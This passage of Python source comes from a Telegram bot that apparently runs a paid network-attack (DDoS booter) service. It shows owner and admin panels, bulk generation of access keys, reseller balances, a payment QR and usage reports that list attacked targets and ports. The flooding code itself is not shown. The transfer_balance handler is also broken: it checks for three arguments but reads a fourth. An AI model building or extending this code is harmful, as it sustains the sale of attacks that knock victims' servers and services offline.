        return
    
    users_db = data.get("users", {})
    if str(user_id) in users_db:
        expiry_str = users_db[str(user_id)].get("expiry_time", "No plan")
        days = get_days_remaining(user_id)
        text = (
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ℹ️ USER INFO                 ┃\n"
            "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            f"┃  👤 ID: {user_id}\n"
            f"┃  📅 EXPIRY: {expiry_str[:10]}\n"
            f"┃  ⏳ DAYS LEFT: {days}\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>"
        )
    else:
        text = (
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ℹ️ USER INFO                 ┃\n"
            "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            f"┃  👤 ID: {user_id}\n"
            "┃  📅 EXPIRY: NO ACTIVE PLAN    ┃\n"
            "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            "┃  💡 /redeem key to activate   ┃\n"
            "┃  💰 /buy to purchase          ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>"
        )
    bot.reply_to(message, text, parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════════════
#                          SPAM PROTECTION
# ═══════════════════════════════════════════════════════════════════════════

# Track user command frequency
user_command_count = {}
user_last_command = {}

# ═══════════════════════════════════════════════════════════════════════════
#                          OWNER PANEL
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['owner'])
def owner_panel(message):
    if not is_owner(message.from_user.id):
        return

    banned = data.get("banned_users", [])
    port_prot = "ON" if data.get("port_protection", False) else "OFF"
    blocked_count = len(data.get("blocked_ports", {}))

    text = (
        "<pre>\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃        👑 OWNER PANEL 👑           ┃\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ 📊 STATISTICS                      ┃\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        f"┃ USERS: {len(data.get('users', {})):<4} │ KEYS: {len(data.get('keys', {})):<4} ┃\n"
        f"┃ RESELLERS: {len(data.get('resellers', {})):<3} │ BANNED: {len(banned):<4} ┃\n"
        f"┃ MAX TIME: {data.get('max_attack_time', DEFAULT_MAX_ATTACK_TIME):<3}s │ CD: {data.get('cooldown', DEFAULT_COOLDOWN):<3}s ┃\n"
        f"┃ CONCURRENT: {data.get('concurrent', DEFAULT_CONCURRENT):<3} │ PORT: {port_prot:<4} ┃\n"
        f"┃ BLOCKED PORTS: {blocked_count:<4}                  ┃\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ 🔑 KEY COMMANDS                    ┃\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ /gen dur          /all_keys        ┃\n"
        "┃ /bankey key       /extendall       ┃\n"
        "┃ /extendkey dur key                 ┃\n"
        "┃ /extendtype add type               ┃\n"
        "┃ /bulk_gen count dur                ┃\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ 💼 RESELLER COMMANDS               ┃\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ /list_resellers     /add_reseller  ┃\n"
        "┃ /add_balance        /remove_reseller┃\n"
        "┃ /deduct_balance     /set_rate      ┃\n"
        "┃ /set_custom_rate    /reseller_stats┃\n"
        "┃ /reseller_logs      /transfer_balance┃\n"
        "┃ /reseller_keys                     ┃\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ 👤 USER COMMANDS                   ┃\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ /ban id           /unban id        ┃\n"
        "┃ /banned_list      /allusers        ┃\n"
        "┃ /add_admin id     /remove_admin id ┃\n"
        "┃ /admin_list       /user_info id    ┃\n"
        "┃ /reset_user id                     ┃\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ ⚙️ SETTINGS COMMANDS               ┃\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ /settime s        /setcooldown     ┃\n"
        "┃ /setconcurrent    /set_api         ┃\n"
        "┃ /show_api         /feedback_toggle ┃\n"
        "┃ /cooldown_toggle  /spam_toggle     ┃\n"
        "┃ /set_qr                            ┃\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ 🛡️ PORT COMMANDS                   ┃\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ /port_protection     /block_port   ┃\n"
        "┃ /unblock_port        /blocked_ports┃\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ 🎬 VIDEO MANAGEMENT                ┃\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ /add_video url      /del_video index┃\n"
        "┃ /list_videos                       ┃\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ 📢 MESSAGING                       ┃\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ /announce msg       /dm id msg     ┃\n"
        "┃ /reply_to id msg    /broadcast msg ┃\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ 📊 LOGGING & BACKUP                ┃\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ /logs              /stats          ┃\n"
        "┃ /uptime            /system_info    ┃\n"
        "┃ /backup            /restore        ┃\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        "</pre>"
    )
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['admin_panel'])
def admin_panel(message):
    if not is_admin(message.from_user.id):
        return

    text = (
        "<pre>\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃        👑 ADMIN PANEL        ┃\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ 📊 COMMANDS:                  ┃\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃ /ban id         /unban id     ┃\n"
        "┃ /banned_list    /allusers     ┃\n"
        "┃ /user_info id   /key_info key ┃\n"
        "┃ /stats          /logs         ┃\n"
        "┃ /settime s      /setcooldown  ┃\n"
        "┃ /setconcurrent  /block_port   ┃\n"
        "┃ /unblock_port   /blocked_ports┃\n"
        "┃ /port_protection on/off       ┃\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        "</pre>"
    )
    bot.reply_to(message, text, parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════════════
#                          COOLDOWN TOGGLE
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['cooldown_toggle'])
def cooldown_toggle(message):
    if not is_owner(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) != 2 or parts[1].lower() not in ['on', 'off']:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /cooldown_toggle on/off   ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    state = parts[1].lower() == 'on'
    data["cooldown_enabled"] = state
    save_data()
    
    status = "ENABLED" if state else "DISABLED"
    bot.reply_to(message,
        f"<pre>\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  ⏱️ COOLDOWN: {status}          ┃\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"</pre>", parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════════════
#                          MESSAGING FEATURES
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['announce'])
def announce(message):
    if not is_owner(message.from_user.id):
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /announce message         ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    announce_msg = parts[1]
    users = data.get("users", {})
    
    success = 0
    failed = 0
    
    status_msg = bot.reply_to(message,
        f"<pre>\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  📢 ANNOUNCING TO {len(users)} USERS ┃\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"</pre>", parse_mode="HTML")
    
    for uid in list(users.keys())[:100]:
        try:
            bot.send_message(int(uid),
                f"<pre>\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  📢 ANNOUNCEMENT              ┃\n"
                f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
                f"┃  {announce_msg[:40]}\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"</pre>", parse_mode="HTML")
            success += 1
            time.sleep(0.05)
        except:
            failed += 1
    
    bot.edit_message_text(
        f"<pre>\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  ✅ ANNOUNCEMENT COMPLETE!    ┃\n"
        f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        f"┃  🟢 SUCCESS: {success}          ┃\n"
        f"┃  🔴 FAILED: {failed}           ┃\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"</pre>",
        chat_id=status_msg.chat.id,
        message_id=status_msg.message_id,
        parse_mode="HTML")

@bot.message_handler(commands=['dm'])
def dm_user(message):
    if not is_owner(message.from_user.id):
        return
    
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /dm user_id message       ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    try:
        uid = int(parts[1])
        dm_msg = parts[2]
        
        bot.send_message(uid,
            f"<pre>\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  📩 DIRECT MESSAGE FROM OWNER ┃\n"
            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            f"┃  {dm_msg[:40]}\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"</pre>", parse_mode="HTML")
        
        bot.reply_to(message,
            f"<pre>\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  ✅ MESSAGE SENT TO {uid}     ┃\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"</pre>", parse_mode="HTML")
    except ValueError:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID USER ID!          ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")

@bot.message_handler(commands=['reply_to'])
def reply_to_user(message):
    if not is_owner(message.from_user.id):
        return
    
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /reply_to user_id message ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    try:
        uid = int(parts[1])
        reply_msg = parts[2]
        
        bot.send_message(uid,
            f"<pre>\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  💬 REPLY FROM OWNER          ┃\n"
            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            f"┃  {reply_msg[:40]}\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"</pre>", parse_mode="HTML")
        
        bot.reply_to(message,
            f"<pre>\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  ✅ REPLY SENT TO {uid}       ┃\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"</pre>", parse_mode="HTML")
    except ValueError:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID USER ID!          ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        
# ═══════════════════════════════════════════════════════════════════════════
#                          PAYMENT INTEGRATION
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['set_qr'])
def set_qr(message):
    if not is_owner(message.from_user.id):
        return
    
    # Check if command has a photo URL or file_id as argument
    parts = message.text.split()
    
    if len(parts) == 2:
        # Method 1: Direct file_id or URL
        qr_input = parts[1]
        
        if qr_input.startswith('http'):
            # Download from URL
            try:
                response = requests.get(qr_input)
                with open("payment_qr.jpg", 'wb') as f:
                    f.write(response.content)
                data["payment_qr"] = "payment_qr.jpg"
                save_data()
                bot.reply_to(message,
                    "<pre>\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃  ✅ QR CODE SET FROM URL!    ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    "</pre>", parse_mode="HTML")
            except:
                bot.reply_to(message,
                    "<pre>\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃  ❌ FAILED TO DOWNLOAD QR!   ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    "</pre>", parse_mode="HTML")
        else:
            # Assume it's a file_id
            try:
                file_info = bot.get_file(qr_input)
                downloaded_file = bot.download_file(file_info.file_path)
                with open("payment_qr.jpg", 'wb') as f:
                    f.write(downloaded_file)
                data["payment_qr"] = "payment_qr.jpg"
                save_data()
                bot.reply_to(message,
                    "<pre>\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃  ✅ QR CODE SET!              ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    "</pre>", parse_mode="HTML")
            except:
                bot.reply_to(message,
                    "<pre>\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃  ❌ INVALID FILE ID!          ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    "</pre>", parse_mode="HTML")
    else:
        # Method 2: Reply to photo (original method)
        if message.reply_to_message and message.reply_to_message.photo:
            try:
                file_id = message.reply_to_message.photo[-1].file_id
                file_info = bot.get_file(file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                
                with open("payment_qr.jpg", 'wb') as f:
                    f.write(downloaded_file)
                
                data["payment_qr"] = "payment_qr.jpg"
                save_data()
                
                bot.reply_to(message,
                    "<pre>\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃  ✅ PAYMENT QR CODE SET!     ┃\n"
                    "┃  Users can now use /buy      ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    "</pre>", parse_mode="HTML")
            except Exception as e:
                bot.reply_to(message,
                    f"<pre>\n"
                    f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    f"┃  ❌ ERROR: {str(e)[:30]}...    ┃\n"
                    f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    f"</pre>", parse_mode="HTML")
        else:
            bot.reply_to(message,
                "<pre>\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  ⚠️ USAGE:                    ┃\n"
                "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
                "┃  Method 1: Reply to a photo  ┃\n"
                "┃  with /set_qr                ┃\n"
                "┃                               ┃\n"
                "┃  Method 2: /set_qr url       ┃\n"
                "┃  /set_qr https://...         ┃\n"
                "┃                               ┃\n"
                "┃  Method 3: /set_qr file_id   ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                "</pre>", parse_mode="HTML")
        
# ═══════════════════════════════════════════════════════════════════════════
#                          KEY MANAGEMENT
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['bulk_gen'])
def bulk_gen(message):
    if not is_owner(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /bulk_gen count duration  ┃\n"
            "┃  Example: /bulk_gen 10 1d     ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    try:
        count = int(parts[1])
        duration_str = parts[2]
        
        if count < 1 or count > 100:
            bot.reply_to(message,
                "<pre>\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  ❌ COUNT MUST BE 1-100       ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                "</pre>", parse_mode="HTML")
            return
        
        duration_secs = parse_duration(duration_str)
        
        generated_keys = []
        for _ in range(count):
            key_name = "K" + "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
            data["keys"][key_name] = {
                "duration": duration_secs,
                "duration_str": duration_str,
                "generated_by": "Owner",
                "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            generated_keys.append(key_name)
        
        save_data()
        
        # Create file with keys
        import io
        file_content = f"─── BULK GENERATED KEYS ({count} keys) ───\n"
        file_content += f"Duration: {duration_str}\n\n"
        for key in generated_keys:
            file_content += f"{key}\n"
        
        file_bio = io.BytesIO(file_content.encode('utf-8'))
        file_bio.name = "bulk_keys.txt"
        bot.send_document(message.chat.id, file_bio)
        
        bot.reply_to(message,
            f"<pre>\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  ✅ {count} KEYS GENERATED!     ┃\n"
            f"┃  Duration: {duration_str}      ┃\n"
            f"┃  File sent with all keys.      ┃\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"</pre>", parse_mode="HTML")
    except ValueError:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID INPUT!            ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")

@bot.message_handler(commands=['key_info'])
def key_info(message):
    if not is_admin(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /key_info key            ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    key = parts[1]
    keys_db = data.get("keys", {})
    
    if key not in keys_db:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ KEY NOT FOUND!           ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    info = keys_db[key]
    status = info.get("status", "active")
    duration = info.get("duration_str", "Unknown")
    generated_by = info.get("generated_by", "Unknown")
    created_at = info.get("created_at", "Unknown")
    
    text = (
        f"<pre>\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  🔑 KEY INFO                  ┃\n"
        f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        f"┃  KEY: {key}\n"
        f"┃  STATUS: {status.upper()}\n"
        f"┃  DURATION: {duration}\n"
        f"┃  GENERATED BY: {generated_by}\n"
        f"┃  CREATED: {created_at}\n"
    )
    
    if status == "redeemed":
        redeemed_by = info.get("redeemed_by", "Unknown")
        redeemed_at = info.get("redeemed_at", "Unknown")
        text += (
            f"┃  REDEEMED BY: {redeemed_by}\n"
            f"┃  REDEEMED AT: {redeemed_at}\n"
        )
    
    text += "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n</pre>"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['key_usage'])
def key_usage(message):
    if not is_owner(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /key_usage key           ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    key = parts[1]
    keys_db = data.get("keys", {})
    
    if key not in keys_db:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ KEY NOT FOUND!           ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    info = keys_db[key]
    
    if info.get("status") != "redeemed":
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ℹ️ KEY NOT REDEEMED YET      ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    redeemed_by = info.get("redeemed_by")
    
    # Get user's attack history
    attacks = []
    for log in data.get("attack_logs", []):
        if str(log.get("user_id")) == redeemed_by:
            attacks.append(log)
    
    text = f"<pre>\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
    text += f"┃  📊 KEY USAGE REPORT         ┃\n"
    text += f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
    text += f"┃  KEY: {key}\n"
    text += f"┃  USER: {redeemed_by}\n"
    text += f"┃  ATTACKS: {len(attacks)}\n"
    
    if attacks:
        text += f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        text += f"┃  LAST 5 ATTACKS:            ┃\n"
        for attack in attacks[-5:]:
            text += f"┃  • {attack.get('target')}:{attack.get('port')}\n"
    
    text += "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n</pre>"
    bot.reply_to(message, text, parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════════════
#                          RESELLER MANAGEMENT
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['reseller_stats'])
def reseller_stats(message):
    if not is_owner(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /reseller_stats user_id   ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    uid = parts[1]
    resellers = data.get("resellers", {})
    
    if uid not in resellers:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ USER IS NOT A RESELLER    ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    reseller_data = resellers[uid]
    balance = reseller_data.get("balance", 0)
    
    # Count keys generated by this reseller
    keys_db = data.get("keys", {})
    generated_keys = 0
    redeemed_keys = 0
    for key, info in keys_db.items():
        if info.get("generated_by") == uid:
            generated_keys += 1
            if info.get("status") == "redeemed":
                redeemed_keys += 1
    
    text = (
        f"<pre>\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  📊 RESELLER STATS            ┃\n"
        f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        f"┃  👤 ID: {uid}\n"
        f"┃  💰 BALANCE: {balance}\n"
        f"┃  🔑 KEYS GENERATED: {generated_keys}\n"
        f"┃  ✅ KEYS REDEEMED: {redeemed_keys}\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"</pre>"
    )
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['reseller_logs'])
def reseller_logs(message):
    if not is_owner(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /reseller_logs user_id    ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    uid = parts[1]
    keys_db = data.get("keys", {})
    
    text = f"<pre>\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
    text += f"┃  📋 RESELLER {uid} KEYS      ┃\n"
    text += f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
    
    count = 0
    for key, info in keys_db.items():
        if info.get("generated_by") == uid:
            count += 1
            status = info.get("status", "active")
            dur = info.get("duration_str", "Unknown")
            if status == "redeemed":
                redeemed_by = info.get("redeemed_by", "Unknown")
                text += f"┃  🔑 {key[:15]}.. {dur} ✅{redeemed_by}\n"
            else:
                text += f"┃  🔑 {key[:15]}.. {dur} ⏳\n"
            if count >= 15:
                text += f"┃  ... and more\n"
                break
    
    if count == 0:
        text += f"┃  No keys found             ┃\n"
    
    text += "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n</pre>"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['transfer_balance'])
def transfer_balance(message):
    if not is_owner(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /transfer_balance from to ┃\n"
            "┃      amount                   ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    try:
        from_uid = parts[1]
        to_uid = parts[2]
        amount = int(parts[3])
        
        resellers = data.get("resellers", {})
        
        if from_uid not in resellers:
            bot.reply_to(message,
                f"<pre>\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  ❌ {from_uid} NOT RESELLER    ┃\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"</pre>", parse_mode="HTML")
            return
        
        if to_uid not in resellers:
            bot.reply_to(message,
                f"<pre>\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  ❌ {to_uid} NOT RESELLER      ┃\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"</pre>", parse_mode="HTML")
            return
        
        from_balance = resellers[from_uid].get("balance", 0)
        if from_balance < amount:
            bot.reply_to(message,
                f"<pre>\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  ❌ INSUFFICIENT BALANCE!     ┃\n"
                f"┃  Balance: {from_balance}       ┃\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"</pre>", parse_mode="HTML")
            return
        
        resellers[from_uid]["balance"] = from_balance - amount
        resellers[to_uid]["balance"] = resellers[to_uid].get("balance", 0) + amount
        save_data()
        
        bot.reply_to(message,
            f"<pre>\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  ✅ BALANCE TRANSFERRED!      ┃\n"
            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            f"┃  FROM: {from_uid}             ┃\n"
            f"┃  TO: {to_uid}                 ┃\n"
            f"┃  AMOUNT: {amount}             ┃\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"</pre>", parse_mode="HTML")
    except (ValueError, IndexError):
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID FORMAT!           ┃\n"
